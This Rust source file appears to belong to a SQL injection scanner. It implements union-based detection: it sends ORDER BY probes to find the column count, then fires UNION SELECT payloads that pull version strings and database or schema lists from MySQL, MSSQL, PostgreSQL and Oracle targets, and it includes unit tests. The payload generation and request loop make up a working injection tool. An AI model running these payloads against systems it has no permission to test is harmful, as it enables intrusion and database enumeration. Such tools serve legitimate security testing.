//! Union-based SQL injection detection - port of legacy/lib/techniques/union_based.py

use once_cell::sync::Lazy;
use regex::Regex;

use crate::http_client::inject_payload_in_url;
use super::{ScanContext, TechniqueResult};

const MAX_COLUMNS: usize = 20;

/// Error keywords that indicate ORDER BY n+1 failed (so column count = n).
static ERROR_KEYWORDS: Lazy<Vec<&'static str>> = Lazy::new(|| {
    vec![
        "unknown column",
        "order by",
        "sqlstate",
        "odbc driver",
        "syntax error",
        "unclosed quotation",
        "error",
    ]
});

/// Patterns to detect successful UNION injection in response (number sequence or version strings).
static INJECTION_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        Regex::new(r"(\d+)[\s,]+(\d+)[\s,]+(\d+)").unwrap(),
        Regex::new(r"(?i)(MySQL|MariaDB)[\s\-_]+(\d+\.\d+\.\d+)").unwrap(),
        Regex::new(r"(?i)(SQL\s*Server|MSSQL)[\s\-_]+(\d+\.\d+\.\d+)").unwrap(),
        Regex::new(r"(?i)(PostgreSQL)[\s\-_]+(\d+\.\d+)").unwrap(),
        Regex::new(r"(?i)(Oracle Database)[\s\-_]+(\d+\.\d+\.\d+)").unwrap(),
        Regex::new(r"(?i)(SQLite)[\s\-_]+(\d+\.\d+\.\d+)").unwrap(),
    ]
});

fn response_indicates_error(text: &str) -> bool {
    let lower = text.to_lowercase();
    ERROR_KEYWORDS.iter().any(|kw| lower.contains(kw))
}

fn detect_injection_in_response(text: &str) -> bool {
    INJECTION_PATTERNS.iter().any(|re| re.is_match(text))
}

fn determine_column_count(ctx: &ScanContext, parameter: &str) -> usize {
    let data = ctx.data.map(|m| m.clone()).unwrap_or_default();

    for i in 1..=MAX_COLUMNS {
        let order_by_payload = format!("' ORDER BY {}--", i);
        let res = if ctx.is_post {
            let mut form = data.clone();
            form.insert(parameter.to_string(), order_by_payload.clone());
            ctx.handler.post(ctx.url, &form)
        } else {
            let url = inject_payload_in_url(ctx.url, parameter, &order_by_payload);
            ctx.handler.get(&url)
        };

        let response = match res {
            Ok(r) => r,
            Err(_) => continue,
        };
        let text = response.text().unwrap_or_default();
        if response_indicates_error(&text) {
            return i.saturating_sub(1).max(1);
        }
    }
    1
}

fn generate_union_payloads(column_count: usize) -> Vec<String> {
    let mut payloads = Vec::new();
    let cols: Vec<String> = (1..=column_count).map(|i| i.to_string()).collect();
    payloads.push(format!("' UNION SELECT {}--", cols.join(",")));

    for i in 1..=column_count {
        let mut cols = vec!["NULL".to_string(); column_count];
        cols[i - 1] = "@@version".to_string();
        payloads.push(format!("' UNION SELECT {}--", cols.join(",")));

        cols[i - 1] = "version()".to_string();
        payloads.push(format!("' UNION SELECT {}--", cols.join(",")));

        if column_count >= 2 {
            cols[i - 1] = "banner".to_string();
            payloads.push(format!("' UNION SELECT {} FROM v$version--", cols.join(",")));
        }
    }

    let mut cols: Vec<String> = (1..=column_count)
        .map(|i| if i == 1 { "schema_name".to_string() } else { "NULL".to_string() })
        .collect();
    payloads.push(format!("' UNION SELECT {} FROM information_schema.schemata--", cols.join(",")));

    cols[0] = "name".to_string();
    payloads.push(format!("' UNION SELECT {} FROM master..sysdatabases--", cols.join(",")));

    cols[0] = "datname".to_string();
    payloads.push(format!("' UNION SELECT {} FROM pg_database--", cols.join(",")));

    payloads
}

fn db_type_from_payload_and_response(payload: &str, response_text: &str) -> String {
    if payload.contains("@@version") {
        if response_text.contains("MySQL") || response_text.contains("MariaDB") {
            return "MySQL".to_string();
        }
        if response_text.contains("SQL Server") {
            return "MSSQL".to_string();
        }
    }
    if payload.contains("version()") && response_text.contains("PostgreSQL") {
        return "PostgreSQL".to_string();
    }
    if payload.contains("v$version") && response_text.contains("Oracle") {
        return "Oracle".to_string();
    }
    if payload.contains("sqlite_version()") && response_text.contains("SQLite") {
        return "SQLite".to_string();
    }
    if payload.contains("information_schema") {
        return "MySQL".to_string();
    }
    if payload.contains("sysdatabases") {
        return "MSSQL".to_string();
    }
    if payload.contains("pg_database") {
        return "PostgreSQL".to_string();
    }
    "Unknown".to_string()
}

/// Scan one parameter: find column count, generate UNION payloads, test until match.
pub fn scan_parameter(ctx: &ScanContext, parameter: &str) -> TechniqueResult {
    let column_count = determine_column_count(ctx, parameter);
    let payloads = generate_union_payloads(column_count);
    let data = ctx.data.map(|m| m.clone()).unwrap_or_default();

    for payload in payloads {
        let res = if ctx.is_post {
            let mut form = data.clone();
            form.insert(parameter.to_string(), payload.clone());
            ctx.handler.post(ctx.url, &form)
        } else {
            let url = inject_payload_in_url(ctx.url, parameter, &payload);
            ctx.handler.get(&url)
        };

        let response = match res {
            Ok(r) => r,
            Err(_) => continue,
        };
        let text = response.text().unwrap_or_default();

        if detect_injection_in_response(&text) {
            let db = db_type_from_payload_and_response(&payload, &text);
            return TechniqueResult::vulnerable(db, payload);
        }
    }

    TechniqueResult::not_vulnerable()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_response_indicates_error() {
        assert!(response_indicates_error("Unknown column 'x' in 'order by'"));
        assert!(response_indicates_error("syntax error near something"));
        assert!(!response_indicates_error("Hello world"));
    }

    #[test]
    fn test_detect_injection_in_response() {
        assert!(detect_injection_in_response("1,2,3,4,5"));
        assert!(detect_injection_in_response("MySQL 5.7.0"));
        assert!(!detect_injection_in_response("no numbers here"));
    }

    #[test]
    fn test_generate_union_payloads() {
        let p = generate_union_payloads(2);
        assert!(!p.is_empty());
        assert!(p[0].contains("UNION SELECT"));
        assert!(p[0].contains("1,2"));
    }
}
